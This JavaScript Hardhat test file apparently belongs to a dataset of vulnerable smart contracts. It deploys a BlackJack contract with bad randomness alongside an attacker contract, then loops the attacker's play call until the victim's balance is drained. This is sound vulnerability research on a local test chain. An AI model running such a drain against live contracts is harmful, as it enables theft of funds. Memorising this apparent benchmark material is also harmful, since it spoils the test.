const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack bad_randomness/blackjack.sol", function () {
  let victimAmount, attackerAmount;
  async function deployContracts() {
    const [v, a] = await ethers.getSigners();
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/bad_randomness/blackjack.sol/BlackJack.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const BlackJack = await ethers.getContractFactory(json.abi, json.bytecode);
    const victim = await BlackJack.deploy();
    await victim.waitForDeployment();

    victimAmount = ethers.parseEther("10");

    await v.sendTransaction({
      to: victim.target,
      value: victimAmount,
    });

    const BlackJackAttacker = await ethers.getContractFactory(
      "contracts/bad_randomness/blackjack_attack.sol:BlackJackAttacker",
    );
    const attacker = await BlackJackAttacker.deploy(victim.target);
    await attacker.waitForDeployment();

    attackerAmount = ethers.parseEther("5");
    await a.sendTransaction({
      to: attacker.target,
      value: attackerAmount,
    });

    return { victim, attacker };
  }

  it("sanity check: bad_randomness/blackjack.sol", async function () {
    const { victim } = await loadFixture(deployContracts);
    const [v, a] = await ethers.getSigners();
    expect(await ethers.provider.getBalance(victim.target)).to.equal(
      ethers.parseEther("10"),
    );
    await expect(victim.connect(a).deal({ value: ethers.parseEther("1") })).to
      .not.be.reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(
      ethers.parseEther("11"),
    );
  });

  it("exploit bad randomness vulnerability", async function () {
    const sleep = (delay) =>
      new Promise((resolve) => setTimeout(resolve, delay));

    const { victim, attacker } = await loadFixture(deployContracts);

    const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceBefore).to.equal(victimAmount);

    const attackerBalanceBefore = await ethers.provider.getBalance(
      attacker.target,
    );
    expect(attackerBalanceBefore).to.equal(attackerAmount);

    let currentBalance = await ethers.provider.getBalance(victim.target);
    while (currentBalance > 0) {
      try {
        await attacker.play();

        currentBalance = await ethers.provider.getBalance(victim.target);

        if (currentBalance == 0) {
          break;
        }
      } catch (error) {
        break;
      }

      await sleep(1);
    }

    const victimBalanceAfter = await ethers.provider.getBalance(victim.target);

    const attackerBalanceAfter = await ethers.provider.getBalance(
      attacker.target,
    );
    expect(attackerBalanceAfter).to.gt(victimBalanceAfter);
  });
});
